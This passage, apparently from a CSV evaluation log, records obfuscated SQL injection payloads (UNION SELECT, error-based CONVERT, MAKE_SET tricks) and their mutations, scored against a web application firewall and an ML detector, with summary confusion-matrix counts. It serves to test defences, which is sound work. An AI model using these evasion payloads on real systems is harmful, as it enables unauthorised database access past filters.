LIkE   0x822 NOT LIKE 2083 aNd  OR 0  =  convert  (  int,  (  SElECt char  (  0x71  )  +char /**/(  113  )  +char  (  112  )  +char  (   OR 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  caSE When   (   oR  anD '	' NOT LIKE '	l'<>0x14fb   lIkE   4241  )   tHEN char  (  49  )   elSE char  (  48	 )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SElEcT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:21.899727,403,200,waf_correct_ml_incorrect
48,2024-12-16T18:57:44.966989,56,200,200,200,both_correct,'T' not like 'T(',2024-12-16T18:57:45.207504,200,403,waf_correct_ml_incorrect,"'T'
not like/**/'T('",2024-12-16T18:57:47.101887,200,200,both_correct,'T' not/**/like/**/'T(',2024-12-16T18:57:49.165490,200,200,both_correct,'T'/*y<*/not/**/lIKE/**/'T(',2024-12-16T18:57:51.354784,200,200,both_correct,'T'/*y<*/not	liKE/**/'T(',2024-12-16T18:57:53.762504,200,200,both_correct
49,2024-12-16T18:57:56.037595,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",403,403,403,both_correct,"-5202 union all SELeCt/**/5332,5332,5332,
AnD 1=8146,0x14d4,5332,5332#R",2024-12-16T18:57:58.877322,403,403,both_correct,"-5202 union all seLeCT 5332,5332, OR 0, AnD (SELECT 1)=8146,0x14d4,'51' NOT LIKE '51u',5332#RU",2024-12-16T18:58:03.273806,403,403,both_correct,"- And (SELECT 1) union all sElEcT 5332,'<'<>'<3', oR 0, aND/**/(SeleCT 1)=8146,0x14d4,'51' not
like '51u',5332#RU",2024-12-16T18:58:09.043260,403,403,both_correct,"- aNd (sEleCt  OR 0) union all SElEct 5332,'<' not like '<'8E]Y'!='8E]Y9'',/*]A*/oR 0, AnD/**/(SELECT 1)=8146,0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:15.560774,403,403,both_correct,"- and (SeLEct  OR (SELECT 0)) union all SelEcT  and 1,'<' not like '<'8E]Y'!='8E]Y9'', Or	0, And/*-AD,d*/(selECT 1)='.s=V'='.s=V',0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:23.528158,403,403,both_correct
50,2024-12-16T18:58:32.380945,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",403,403,200,waf_correct_ml_incorrect,"-8791""   )    )     )   or make_set  (  3173 IN (3172,3173,3174)  =  6620, AND (SELECT 1)  )   and /**/ 	(    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:37.476014,403,403,both_correct,"- or 0""   )    )     )   or make_set  (  3173 IN ((SELECT 3172),3173,3174)  =  1247!=1248, AND (SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:44.883223,403,403,both_correct,"- OR 0""   )    )     ) 	 or make_set  (  3173 IN ((SELECT 3172),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND (SELECT 1)  )   and    (    (     (/**/ ""pvdk""  =  ""pvdk",2024-12-16T18:58:52.958698,403,403,both_correct,"- or 3053 In (3052,3053,3054)""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND	(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:02.136055,403,403,both_correct,"- or 3053 IN (3052,3053,(seLEct  AND 1))""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1) /**/=  'l'!='l_'!=(SELECT 'ct' NOT LIKE 'ct*'), AND
(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:12.436965,403,403,both_correct

Overall Results
WAF TP,165
WAF TN,103
WAF FP,5
WAF FN,27
ML TP,113
ML TN,103
ML FP,5
ML FN,79

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,201,15
ML Incorrect,67,17
